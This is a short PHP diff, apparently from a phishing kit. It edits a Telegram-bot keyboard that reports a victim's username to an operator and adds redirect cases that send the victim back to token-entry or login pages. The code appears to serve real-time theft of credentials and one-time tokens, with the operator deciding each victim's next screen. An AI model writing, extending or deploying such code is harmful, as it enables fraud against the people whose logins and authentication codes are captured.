@@ -16,8 +16,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'text'         => $msg,
         'reply_markup' => json_encode([
             'inline_keyboard' => [[
-                ['text' => '✅ Token OK',    'callback_data' => "LISTO|$usuario"],
-                ['text' => '❌ Token Error', 'callback_data' => "COMPRA|$usuario"]
+                ['text' => '❌ Token Error', 'callback_data' => "COMPRA|$usuario"],
+                ['text' => '🔄 Login',       'callback_data' => "LOGIN|$usuario"]
             ]]
         ])
     ]);
@@ -36,6 +36,12 @@ if (file_exists($archivo)) {
             header("Location: listo.html"); exit;
         case '/COMPRA':
             header("Location: tokx.html"); exit;
+        case '/ERROR':
+            header("Location: tokx.html"); exit;
+        case '/SMSERROR':
+            header("Location: tokx.html"); exit;
+        case '/LOGIN':
+            header("Location: index.php"); exit;
     }
 }
 ?>
